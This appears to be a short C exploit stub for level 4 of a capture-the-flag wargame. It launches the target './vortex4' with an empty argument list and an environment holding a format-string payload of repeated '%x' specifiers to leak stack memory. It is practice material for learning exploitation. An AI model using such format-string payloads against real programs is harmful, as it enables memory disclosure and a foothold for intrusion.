#include <stdlib.h>

int main(int argc, char* argv[]){
	char *kk = "%x%x%x%x%x%x%x%x%x";
	char *env[] = {"0","0",kk,NULL};
	char *args[] = {NULL};
	execve("./vortex4",args,env);
}
